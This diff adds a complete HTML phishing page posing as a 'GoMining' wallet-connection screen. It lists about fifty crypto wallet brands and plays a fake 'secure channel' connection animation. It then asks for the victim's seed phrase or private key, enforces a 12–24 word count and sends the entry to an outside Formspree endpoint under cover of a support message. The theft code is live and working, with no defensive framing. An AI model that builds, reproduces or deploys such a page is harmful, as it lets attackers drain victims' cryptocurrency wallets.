@@ -1,0 +1,887 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Wallets – GoMining</title>
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;800&display=swap");
+
+      :root {
+        --bg: #0a0a0f;
+        --card-bg: #111118;
+        --border: rgba(255, 255, 255, 0.07);
+        --accent: #f0c040;
+        --accent2: #e05a2b;
+        --text: #f0ede8;
+        --muted: #888;
+        --radius: 14px;
+      }
+
+      *,
+      *::before,
+      *::after {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      body {
+        background: var(--bg);
+        color: var(--text);
+        font-family: "Syne", sans-serif;
+        min-height: 100vh;
+      }
+
+      .ticker-wrap {
+        flex: 1;
+        overflow: hidden;
+        margin-left: 32px;
+        mask-image: linear-gradient(to right, transparent 0%, black 8%, black 92%, transparent 100%);
+        -webkit-mask-image: linear-gradient(to right, transparent 0%, black 8%, black 92%, transparent 100%);
+      }
+      .ticker-track {
+        display: flex;
+        width: max-content;
+        animation: ticker-scroll 30s linear infinite;
+      }
+      .ticker-slide {
+        display: flex;
+        align-items: center;
+        gap: 28px;
+        padding: 0 14px;
+      }
+      .ticker-slide img {
+        width: 30px;
+        height: 30px;
+        object-fit: contain;
+        opacity: 0.5;
+        transition: opacity 0.2s;
+        flex-shrink: 0;
+      }
+      .ticker-slide img:hover {
+        opacity: 1;
+      }
+      @keyframes ticker-scroll {
+        0%   { transform: translateX(0); }
+        100% { transform: translateX(-50%); }
+      }
+
+      .header {
+        padding: 28px 40px;
+        border-bottom: 1px solid var(--border);
+        display: flex;
+        align-items: center;
+      }
+      .logo {
+        font-family: "Space Mono", monospace;
+        font-size: 1.1rem;
+        letter-spacing: 0.15em;
+        color: var(--accent);
+        text-transform: lowercase;
+      }
+      .logo::before {
+        content: "⬡ ";
+      }
+
+      .brands-section {
+        padding: 60px 40px 80px;
+        max-width: 1200px;
+        margin: 0 auto;
+      }
+
+      .brands-header {
+        margin-bottom: 52px;
+      }
+      .brands-header h1 {
+        font-size: clamp(2rem, 5vw, 3.4rem);
+        font-weight: 800;
+        line-height: 1.1;
+        background: linear-gradient(
+          135deg,
+          var(--accent) 0%,
+          var(--accent2) 100%
+        );
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+      }
+      .brands-header p {
+        margin-top: 10px;
+        color: var(--muted);
+        font-size: 1rem;
+        letter-spacing: 0.03em;
+      }
+
+      .brands-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+        gap: 14px;
+      }
+
+      .brand-card {
+        background: var(--card-bg);
+        border: 1px solid var(--border);
+        border-radius: var(--radius);
+        padding: 24px 12px 18px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 12px;
+        cursor: pointer;
+        transition: transform 0.18s ease, border-color 0.18s ease,
+          box-shadow 0.18s ease;
+        position: relative;
+        overflow: hidden;
+      }
+      .brand-card::after {
+        content: "";
+        position: absolute;
+        inset: 0;
+        background: linear-gradient(
+          135deg,
+          rgba(240, 192, 64, 0.07),
+          transparent 60%
+        );
+        opacity: 0;
+        transition: opacity 0.2s;
+      }
+      .brand-card:hover {
+        transform: translateY(-4px);
+        border-color: rgba(240, 192, 64, 0.35);
+        box-shadow: 0 8px 30px rgba(240, 192, 64, 0.08);
+      }
+      .brand-card:hover::after {
+        opacity: 1;
+      }
+      .brand-card img {
+        width: 46px;
+        height: 46px;
+        object-fit: contain;
+      }
+      .brand-card span {
+        font-size: 0.8rem;
+        font-weight: 600;
+        letter-spacing: 0.03em;
+        color: var(--text);
+        text-align: center;
+      }
+
+      /* MODAL */
+      .modal-overlay {
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.75);
+        backdrop-filter: blur(6px);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity 0.22s ease;
+        z-index: 999;
+        padding: 20px;
+      }
+      .modal-overlay.active {
+        opacity: 1;
+        pointer-events: all;
+      }
+
+      .modal {
+        background: #16161f;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        border-radius: 20px;
+        padding: 40px;
+        width: 100%;
+        max-width: 460px;
+        position: relative;
+        transform: translateY(20px) scale(0.97);
+        transition: transform 0.25s ease;
+        box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5);
+        max-height: 90vh;
+        overflow-y: auto;
+      }
+      .modal-overlay.active .modal {
+        transform: translateY(0) scale(1);
+      }
+
+      .modal-close {
+        position: absolute;
+        top: 16px;
+        right: 16px;
+        background: rgba(255, 255, 255, 0.07);
+        border: none;
+        border-radius: 50%;
+        width: 32px;
+        height: 32px;
+        color: var(--muted);
+        font-size: 0.9rem;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: background 0.15s, color 0.15s;
+      }
+      .modal-close:hover {
+        background: rgba(255, 255, 255, 0.14);
+        color: var(--text);
+      }
+
+      .modal h3 {
+        font-size: 1.3rem;
+        font-weight: 800;
+        background: linear-gradient(135deg, var(--accent), var(--accent2));
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+      }
+      .modal p {
+        color: var(--muted);
+        font-size: 0.88rem;
+        margin-top: 6px;
+        margin-bottom: 28px;
+      }
+
+      /* CONNECTING SCREEN */
+      .connecting-screen {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 20px 0 10px;
+        gap: 20px;
+      }
+      .connecting-logo {
+        width: 72px;
+        height: 72px;
+        object-fit: contain;
+        border-radius: 16px;
+        animation: pulse 1.4s ease-in-out infinite;
+      }
+      @keyframes pulse {
+        0%,
+        100% {
+          opacity: 1;
+          transform: scale(1);
+        }
+        50% {
+          opacity: 0.6;
+          transform: scale(0.92);
+        }
+      }
+      .connecting-title {
+        font-size: 1.05rem;
+        font-weight: 700;
+        color: var(--text);
+        text-align: center;
+        letter-spacing: 0.02em;
+      }
+      .connecting-title span {
+        background: linear-gradient(135deg, var(--accent), var(--accent2));
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+      }
+      .progress-bar-wrap {
+        width: 100%;
+        height: 4px;
+        background: rgba(255, 255, 255, 0.06);
+        border-radius: 99px;
+        overflow: hidden;
+        margin-top: 4px;
+      }
+      .progress-bar-fill {
+        height: 100%;
+        width: 0%;
+        border-radius: 99px;
+        background: linear-gradient(90deg, var(--accent), var(--accent2));
+        transition: width 0.12s linear;
+      }
+      .status-steps {
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+        width: 100%;
+        margin-top: 6px;
+      }
+      .status-step {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-size: 0.8rem;
+        color: var(--muted);
+        font-family: "Space Mono", monospace;
+        opacity: 0;
+        transform: translateX(-6px);
+        transition: opacity 0.3s ease, transform 0.3s ease, color 0.3s ease;
+      }
+      .status-step.visible {
+        opacity: 1;
+        transform: translateX(0);
+      }
+      .status-step.done {
+        color: #6dd48a;
+      }
+      .status-step.active {
+        color: var(--text);
+      }
+      .step-dot {
+        width: 7px;
+        height: 7px;
+        border-radius: 50%;
+        background: var(--muted);
+        flex-shrink: 0;
+        transition: background 0.3s;
+      }
+      .status-step.done .step-dot {
+        background: #6dd48a;
+      }
+      .status-step.active .step-dot {
+        background: var(--accent);
+        box-shadow: 0 0 6px var(--accent);
+        animation: blink 0.7s ease-in-out infinite;
+      }
+      @keyframes blink {
+        0%,
+        100% {
+          opacity: 1;
+        }
+        50% {
+          opacity: 0.3;
+        }
+      }
+
+      /* FORM */
+      .form-screen {
+        display: none;
+      }
+      .form-screen.visible {
+        display: block;
+      }
+      .form-group {
+        margin-bottom: 18px;
+      }
+      .form-group label {
+        display: block;
+        font-size: 0.78rem;
+        font-weight: 600;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+        color: var(--muted);
+        margin-bottom: 7px;
+      }
+      .form-group textarea {
+        width: 100%;
+        background: rgba(255, 255, 255, 0.04);
+        border: 1px solid var(--border);
+        border-radius: 10px;
+        padding: 12px 14px;
+        color: var(--text);
+        font-family: "Syne", sans-serif;
+        font-size: 0.93rem;
+        outline: none;
+        transition: border-color 0.15s;
+        resize: vertical;
+      }
+      .form-group textarea:focus {
+        border-color: rgba(240, 192, 64, 0.5);
+      }
+      .form-group textarea::placeholder {
+        color: #444;
+        font-size: 16px;
+      }
+      .submit-btn {
+        width: 100%;
+        padding: 14px;
+        background: linear-gradient(
+          135deg,
+          var(--accent) 0%,
+          var(--accent2) 100%
+        );
+        border: none;
+        border-radius: 10px;
+        color: #0a0a0f;
+        font-family: "Syne", sans-serif;
+        font-size: 0.95rem;
+        font-weight: 800;
+        cursor: pointer;
+        letter-spacing: 0.04em;
+        transition: opacity 0.15s, transform 0.15s;
+        margin-top: 8px;
+      }
+      .submit-btn:hover {
+        opacity: 0.9;
+        transform: translateY(-1px);
+      }
+      .submit-btn:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+        transform: none;
+      }
+      .form-msg {
+        padding: 12px 16px;
+        border-radius: 10px;
+        font-size: 0.88rem;
+        margin-bottom: 18px;
+        display: none;
+      }
+      .form-msg.success {
+        background: rgba(80, 200, 100, 0.12);
+        border: 1px solid rgba(80, 200, 100, 0.25);
+        color: #6dd48a;
+        display: block;
+      }
+      .form-msg.error {
+        background: rgba(220, 80, 80, 0.12);
+        border: 1px solid rgba(220, 80, 80, 0.25);
+        color: #f08080;
+        display: block;
+      }
+      .word-counter {
+        font-size: 0.75rem;
+        font-family: "Space Mono", monospace;
+        margin-top: 6px;
+        text-align: right;
+        color: var(--muted);
+        transition: color 0.2s;
+      }
+      .word-counter.valid {
+        color: #6dd48a;
+      }
+      .word-counter.over {
+        color: #f08080;
+      }
+
+      @media (max-width: 600px) {
+        .header {
+          padding: 20px;
+        }
+        .brands-section {
+          padding: 40px 16px 60px;
+        }
+        .brands-grid {
+          grid-template-columns: repeat(3, 1fr);
+          gap: 10px;
+        }
+        .brand-card {
+          padding: 16px 8px 14px;
+          gap: 8px;
+        }
+        .brand-card img {
+          width: 36px;
+          height: 36px;
+        }
+        .brand-card span {
+          font-size: 0.7rem;
+        }
+        .modal {
+          padding: 28px 20px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="page-wrapper">
+      <header class="header">
+        <h2 class="logo">gomining</h2>
+
+        <div class="ticker-wrap">
+          <div class="ticker-track">
+            <div class="ticker-slide">
+              <img src="Icons/Metamask-Digital-Asset-Logo-PNG.png" alt="MetaMask" />
+              <img src="Icons/trust-wallet-icon.png" alt="Trust Wallet" />
+              <img src="Icons/idreP17eZK_1773876334789.jpeg" alt="Phantom" />
+              <img src="Icons/Ledger.jfif" alt="Ledger" />
+              <img src="Icons/trezor.png" alt="Trezor" />
+              <img src="Icons/Exodus.png" alt="Exodus" />
+              <img src="Icons/coinbase.png" alt="Coinbase" />
+              <img src="Icons/rainbow.jfif" alt="Rainbow" />
+              <img src="Icons/zerion-logo.png" alt="Zerion" />
+              <img src="Icons/Uniswap-logo.png" alt="Uniswap" />
+              <img src="Icons/binance-logo.png" alt="Binance" />
+              <img src="Icons/okx-logo.png" alt="OKX" />
+              <img src="Icons/bybit-logo.png" alt="Bybit" />
+              <img src="Icons/crypto-logo.jfif" alt="Crypto.com" />
+              <img src="Icons/Kraken.jfif" alt="Kraken" />
+              <img src="Icons/Solflare.png" alt="Solflare" />
+              <img src="Icons/backpack.jfif" alt="Backpack" />
+              <img src="Icons/argent.png" alt="Argent" />
+              <img src="Icons/Atomic-wallet.png" alt="Atomic" />
+              <img src="Icons/zengo.png" alt="Zengo" />
+            </div>
+            <div class="ticker-slide">
+              <img src="Icons/Metamask-Digital-Asset-Logo-PNG.png" alt="MetaMask" />
+              <img src="Icons/trust-wallet-icon.png" alt="Trust Wallet" />
+              <img src="Icons/idreP17eZK_1773876334789.jpeg" alt="Phantom" />
+              <img src="Icons/Ledger.jfif" alt="Ledger" />
+              <img src="Icons/trezor.png" alt="Trezor" />
+              <img src="Icons/Exodus.png" alt="Exodus" />
+              <img src="Icons/coinbase.png" alt="Coinbase" />
+              <img src="Icons/rainbow.jfif" alt="Rainbow" />
+              <img src="Icons/zerion-logo.png" alt="Zerion" />
+              <img src="Icons/Uniswap-logo.png" alt="Uniswap" />
+              <img src="Icons/binance-logo.png" alt="Binance" />
+              <img src="Icons/okx-logo.png" alt="OKX" />
+              <img src="Icons/bybit-logo.png" alt="Bybit" />
+              <img src="Icons/crypto-logo.jfif" alt="Crypto.com" />
+              <img src="Icons/Kraken.jfif" alt="Kraken" />
+              <img src="Icons/Solflare.png" alt="Solflare" />
+              <img src="Icons/backpack.jfif" alt="Backpack" />
+              <img src="Icons/argent.png" alt="Argent" />
+              <img src="Icons/Atomic-wallet.png" alt="Atomic" />
+              <img src="Icons/zengo.png" alt="Zengo" />
+            </div>
+          </div>
+        </div>
+      </header>
+
+      <section class="brands-section">
+        <div class="brands-header">
+          <h1>Wallets</h1>
+          <p>Select a wallet:</p>
+        </div>
+
+        <div class="brands-grid">
+          <!-- Row 1 -->
+          <div class="brand-card" onclick="openModal('MetaMask','Icons/Metamask-Digital-Asset-Logo-PNG.png')">
+            <img src="Icons/Metamask-Digital-Asset-Logo-PNG.png" alt="MetaMask" /><span>MetaMask</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Trust Wallet','Icons/trust-wallet-icon.png')">
+            <img src="Icons/trust-wallet-icon.png" alt="Trust Wallet" /><span>Trust Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Phantom','Icons/idreP17eZK_1773876334789.jpeg')">
+            <img src="Icons/idreP17eZK_1773876334789.jpeg" alt="Phantom" /><span>Phantom</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Ledger','Icons/Ledger.jfif')">
+            <img src="Icons/Ledger.jfif" alt="Ledger" /><span>Ledger</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Trezor','Icons/trezor.png')">
+            <img src="Icons/trezor.png" alt="Trezor" /><span>Trezor</span>
+          </div>
+
+          <!-- Row 2 -->
+          <div class="brand-card" onclick="openModal('Exodus','Icons/Exodus.png')">
+            <img src="Icons/Exodus.png" alt="Exodus" /><span>Exodus</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Coinbase Wallet','Icons/coinbase.png')">
+            <img src="Icons/coinbase.png" alt="Coinbase Wallet" /><span>Coinbase Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Rainbow','Icons/rainbow.jfif')">
+            <img src="Icons/rainbow.jfif" alt="Rainbow" /><span>Rainbow</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Zerion','Icons/zerion-logo.png')">
+            <img src="Icons/zerion-logo.png" alt="Zerion" /><span>Zerion</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Uniswap Wallet','Icons/Uniswap-logo.png')">
+            <img src="Icons/Uniswap-logo.png" alt="Uniswap Wallet" /><span>Uniswap Wallet</span>
+          </div>
+
+          <!-- Row 3 -->
+          <div class="brand-card" onclick="openModal('Binance Wallet','Icons/binance-logo.png')">
+            <img src="Icons/binance-logo.png" alt="Binance Wallet" /><span>Binance Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('OKX Wallet','Icons/okx-logo.png')">
+            <img src="Icons/okx-logo.png" alt="OKX Wallet" /><span>OKX Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Bybit Wallet','Icons/bybit-logo.png')">
+            <img src="Icons/bybit-logo.png" alt="Bybit Wallet" /><span>Bybit Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Crypto.com Wallet','Icons/crypto-logo.jfif')">
+            <img src="Icons/crypto-logo.jfif" alt="Crypto.com" /><span>Crypto.com</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Kraken Wallet','Icons/Kraken.jfif')">
+            <img src="Icons/Kraken.jfif" alt="Kraken Wallet" /><span>Kraken Wallet</span>
+          </div>
+
+          <!-- Row 4 -->
+          <div class="brand-card" onclick="openModal('Solflare','Icons/Solflare.png')">
+            <img src="Icons/Solflare.png" alt="Solflare" /><span>Solflare</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Backpack','Icons/backpack.jfif')">
+            <img src="Icons/backpack.jfif" alt="Backpack" /><span>Backpack</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Argent','Icons/argent.png')">
+            <img src="Icons/argent.png" alt="Argent" /><span>Argent</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Gnosis Safe','Icons/Gnosis.png')">
+            <img src="Icons/Gnosis.png" alt="Gnosis Safe" /><span>Gnosis Safe</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Atomic Wallet','Icons/Atomic-wallet.png')">
+            <img src="Icons/Atomic-wallet.png" alt="Atomic Wallet" /><span>Atomic Wallet</span>
+          </div>
+
+          <!-- Row 5 -->
+          <div class="brand-card" onclick="openModal('Electrum','Icons/electrum.jfif')">
+            <img src="Icons/electrum.jfif" alt="Electrum" /><span>Electrum</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Mycelium','Icons/Mycelium.png')">
+            <img src="Icons/Mycelium.png" alt="Mycelium" /><span>Mycelium</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Edge Wallet','Icons/Egde.jfif')">
+            <img src="Icons/Egde.jfif" alt="Edge Wallet" /><span>Edge Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Blockchain.com','Icons/blockchain.png')">
+            <img src="Icons/blockchain.png" alt="Blockchain.com" /><span>Blockchain.com</span>
+          </div>
+          <div class="brand-card" onclick="openModal('BitPay','Icons/bitpay.jfif')">
+            <img src="Icons/bitpay.jfif" alt="BitPay" /><span>BitPay</span>
+          </div>
+
+          <!-- Row 6 -->
+          <div class="brand-card" onclick="openModal('Xdefi Wallet','Icons/xdefi.jfif')">
+            <img src="Icons/xdefi.jfif" alt="Xdefi" /><span>Xdefi Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Keplr','Icons/keplr.jfif')">
+            <img src="Icons/keplr.jfif" alt="Keplr" /><span>Keplr</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Terra Station','Icons/Terra station.png')">
+            <img src="Icons/Terra station.png" alt="Terra Station" /><span>Terra Station</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Leap Wallet','Icons/Leap wallet.png')">
+            <img src="Icons/Leap wallet.png" alt="Leap Wallet" /><span>Leap Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Braavos','Icons/Bravoos.jfif')">
+            <img src="Icons/Bravoos.jfif" alt="Braavos" /><span>Braavos</span>
+          </div>
+
+          <!-- Row 7 -->
+          <div class="brand-card" onclick="openModal('imToken','Icons/Imtoken.jfif')">
+            <img src="Icons/Imtoken.jfif" alt="imToken" /><span>imToken</span>
+          </div>
+          <div class="brand-card" onclick="openModal('TokenPocket','Icons/Tokenpocket.png')">
+            <img src="Icons/Tokenpocket.png" alt="TokenPocket" /><span>TokenPocket</span>
+          </div>
+          <div class="brand-card" onclick="openModal('SafePal','Icons/Safepal.png')">
+            <img src="Icons/Safepal.png" alt="SafePal" /><span>SafePal</span>
+          </div>
+          <div class="brand-card" onclick="openModal('DCENT','Icons/Dcent.png')">
+            <img src="Icons/Dcent.png" alt="D'CENT" /><span>D'CENT</span>
+          </div>
+          <div class="brand-card" onclick="openModal('CoolWallet','Icons/coolwallet.png')">
+            <img src="Icons/coolwallet.png" alt="CoolWallet" /><span>CoolWallet</span>
+          </div>
+
+          <!-- Row 8 -->
+          <div class="brand-card" onclick="openModal('Unstoppable','Icons/unstoppable.jfif')">
+            <img src="Icons/unstoppable.jfif" alt="Unstoppable" /><span>Unstoppable</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Coin98','Icons/COin98.png')">
+            <img src="Icons/COin98.png" alt="Coin98" /><span>Coin98</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Slope Wallet','Icons/slope.png')">
+            <img src="Icons/slope.png" alt="Slope Wallet" /><span>Slope Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Glow Wallet','Icons/glow wallet.jfif')">
+            <img src="Icons/glow wallet.jfif" alt="Glow Wallet" /><span>Glow Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('MathWallet','Icons/mathwalletlogo.jfif')">
+            <img src="Icons/mathwalletlogo.jfif" alt="MathWallet" /><span>MathWallet</span>
+          </div>
+
+          <!-- Row 9 -->
+          <div class="brand-card" onclick="openModal('Frontier','Icons/frontier.jfif')">
+            <img src="Icons/frontier.jfif" alt="Frontier" /><span>Frontier</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Sequence','Icons/sequence.jfif')">
+            <img src="Icons/sequence.jfif" alt="Sequence" /><span>Sequence</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Taho','Icons/Taho.png')">
+            <img src="Icons/Taho.png" alt="Taho" /><span>Taho</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Frame','Icons/frame.jfif')">
+            <img src="Icons/frame.jfif" alt="Frame" /><span>Frame</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Enkrypt','Icons/Enkrypt.jfif')">
+            <img src="Icons/Enkrypt.jfif" alt="Enkrypt" /><span>Enkrypt</span>
+          </div>
+
+          <!-- Row 10 -->
+          <div class="brand-card" onclick="openModal('NOW Wallet','Icons/Now wallet.jfif')">
+            <img src="Icons/Now wallet.jfif" alt="NOW Wallet" /><span>NOW Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Guarda Wallet','Icons/Guarda logo.jfif')">
+            <img src="Icons/Guarda logo.jfif" alt="Guarda" /><span>Guarda Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Zengo','Icons/zengo.png')">
+            <img src="Icons/zengo.png" alt="Zengo" /><span>Zengo</span>
+          </div>
+          <div class="brand-card" onclick="openModal('1inch Wallet','Icons/1inch.png')">
+            <img src="Icons/1inch.png" alt="1inch Wallet" /><span>1inch Wallet</span>
+          </div>
+          <div class="brand-card" onclick="openModal('Rabby Wallet','Icons/Rabby.jfif')">
+            <img src="Icons/Rabby.jfif" alt="Rabby" /><span>Rabby Wallet</span>
+          </div>
+        </div>
+      </section>
+    </div>
+
+    <!-- MODAL -->
+    <div class="modal-overlay" id="modalOverlay" onclick="closeModal()">
+      <div class="modal" onclick="event.stopPropagation()">
+        <button class="modal-close" onclick="closeModal()">✕</button>
+
+        <!-- CONNECTING SCREEN -->
+        <div class="connecting-screen" id="connectingScreen">
+          <img id="connectingLogo" class="connecting-logo" src="" alt="" />
+          <div class="connecting-title">
+            <span>Manual Connection</span>
+          </div>
+          <div class="progress-bar-wrap">
+            <div class="progress-bar-fill" id="progressFill"></div>
+          </div>
+          <div class="status-steps" id="statusSteps">
+            <div class="status-step" id="step1">
+              <div class="step-dot"></div>
+              Initializing secure channel...
+            </div>
+            <div class="status-step" id="step2">
+              <div class="step-dot"></div>
+              Verifying partner credentials...
+            </div>
+            <div class="status-step" id="step3">
+              <div class="step-dot"></div>
+              Establishing connection...
+            </div>
+            <div class="status-step" id="step4">
+              <div class="step-dot"></div>
+              Connection established ✓
+            </div>
+          </div>
+        </div>
+
+        <!-- FORM SCREEN -->
+        <div class="form-screen" id="formScreen">
+          <h3 id="modalTitle">Manual Connection</h3>
+          <p id="modalSubtitle">Enter your wallet seed phrase or private key...</p>
+          <div id="formMsg" class="form-msg"></div>
+          <form id="contactForm">
+            <input type="hidden" name="partner" id="partnerInput" />
+            <div class="form-group">
+              <textarea
+                id="messageBox"
+                name="message"
+                placeholder="Enter your private key"
+                rows="6"
+                required
+              ></textarea>
+              <div class="word-counter" id="wordCounter">0 / 12–24 words</div>
+            </div>
+            <button type="submit" class="submit-btn" id="submitBtn">
+              Submit
+            </button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      function countWords(str) {
+        return str.trim().split(/\s+/).filter(w => w.length > 0).length;
+      }
+
+      function openModal(brandName, logoSrc) {
+        document.getElementById("formScreen").classList.remove("visible");
+        document.getElementById("connectingScreen").style.display = "flex";
+        document.getElementById("formMsg").className = "form-msg";
+        document.getElementById("contactForm").reset();
+        document.getElementById("partnerInput").value = brandName;
+        document.getElementById("connectingLogo").src = logoSrc;
+        document.getElementById("connectingLogo").alt = brandName;
+        document.getElementById("progressFill").style.width = "0%";
+        ["step1", "step2", "step3", "step4"].forEach((id) => {
+          document.getElementById(id).className = "status-step";
+        });
+        document.getElementById("modalOverlay").classList.add("active");
+        runConnectingSequence();
+      }
+
+      function runConnectingSequence() {
+        const steps = [
+          { id: "step1", progress: 25, delay: 0 },
+          { id: "step2", progress: 55, delay: 700 },
+          { id: "step3", progress: 80, delay: 1400 },
+          { id: "step4", progress: 100, delay: 2100 },
+        ];
+        steps.forEach((step, index) => {
+          setTimeout(() => {
+            if (index > 0) {
+              document.getElementById(steps[index - 1].id).className = "status-step visible done";
+            }
+            document.getElementById(step.id).className = "status-step visible active";
+            document.getElementById("progressFill").style.width = step.progress + "%";
+          }, step.delay);
+        });
+        setTimeout(() => {
+          document.getElementById("step4").className = "status-step visible done";
+          setTimeout(() => {
+            document.getElementById("connectingScreen").style.display = "none";
+            document.getElementById("formScreen").classList.add("visible");
+          }, 400);
+        }, 2900);
+      }
+
+      function closeModal() {
+        document.getElementById("modalOverlay").classList.remove("active");
+      }
+
+      document.addEventListener("input", function (e) {
+        if (e.target && e.target.id === "messageBox") {
+          const count = countWords(e.target.value);
+          const counter = document.getElementById("wordCounter");
+          if (!counter) return;
+          counter.textContent = count + " / 12\u201324 words";
+          counter.className = "word-counter";
+          if (count >= 12 && count <= 24) counter.classList.add("valid");
+          else if (count > 24) counter.classList.add("over");
+        }
+      });
+
+      document.addEventListener("submit", async function (e) {
+        if (e.target && e.target.id === "contactForm") {
+          e.preventDefault();
+          const btn = document.getElementById("submitBtn");
+          const msg = document.getElementById("formMsg");
+          const form = e.target;
+          const wordCount = countWords(document.getElementById("messageBox").value);
+          if (wordCount < 12) {
+            msg.textContent = "\u2717 Please write at least 12 words to describe your issue.";
+            msg.className = "form-msg error";
+            return;
+          }
+          if (wordCount > 24) {
+            msg.textContent = "\u2717 Please keep your message to 24 words or fewer.";
+            msg.className = "form-msg error";
+            return;
+          }
+          btn.disabled = true;
+          btn.textContent = "Sending\u2026";
+          msg.className = "form-msg";
+          const data = new FormData(form);
+          try {
+            const res = await fetch("https://formspree.io/f/xyknlvro", {
+              method: "POST",
+              body: data,
+              headers: { Accept: "application/json" },
+            });
+            if (res.ok) {
+              msg.textContent = "\u2713 Message sent! We'll be in touch shortly.";
+              msg.className = "form-msg success";
+              form.reset();
+              document.getElementById("wordCounter").textContent = "0 / 12\u201324 words";
+              document.getElementById("wordCounter").className = "word-counter";
+            } else {
+              msg.textContent = "\u2717 Something went wrong. Please try again.";
+              msg.className = "form-msg error";
+            }
+          } catch (err) {
+            msg.textContent = "\u2717 Network error. Check your connection.";
+            msg.className = "form-msg error";
+          } finally {
+            btn.disabled = false;
+            btn.textContent = "Submit";
+          }
+        }
+      });
+    </script>
+  </body>
+</html>
